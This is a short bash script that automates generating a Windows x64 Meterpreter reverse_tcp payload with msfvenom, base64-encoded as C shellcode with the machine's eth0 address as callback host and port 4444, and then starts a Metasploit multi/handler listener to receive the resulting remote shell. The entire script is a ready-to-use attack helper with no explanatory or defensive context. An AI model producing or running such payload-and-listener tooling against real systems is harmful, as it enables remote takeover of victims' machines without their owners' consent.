#!/bin/bash

# Get the IP address of eth0 interface
ip_address=$(ip -o -4 addr show eth0 | awk '{print $4}' | cut -d '/' -f 1)

# Set the payload and other parameters
payload="windows/x64/meterpreter/reverse_tcp"
lhost="$ip_address"
lport="4444"

# Prompt the user to confirm generate base64 encoding
echo Generate base64:
echo -n "(Y/n)? "
read choice

if [ "$choice" = "Y" ] || [ "$choice" = "y" ]; then
    # Generate the encoded payload using msfvenom
    msfvenom_cmd="msfvenom -p $payload LHOST=$lhost LPORT=$lport --encrypt base64 -f c"

    # Display the msfvenom command
    echo $msfvenom_cmd

    # Execute the msfvenom command
    eval $msfvenom_cmd
fi

# Display Metasploit commands
msfconsole_cmd="msfconsole -q -x 'use exploit/multi/handler; set payload $payload; set LHOST $lhost; set LPORT $lport; run'"

# Display the msfconsole command
echo $msfconsole_cmd

# Execute the msfconsole command
eval $msfconsole_cmd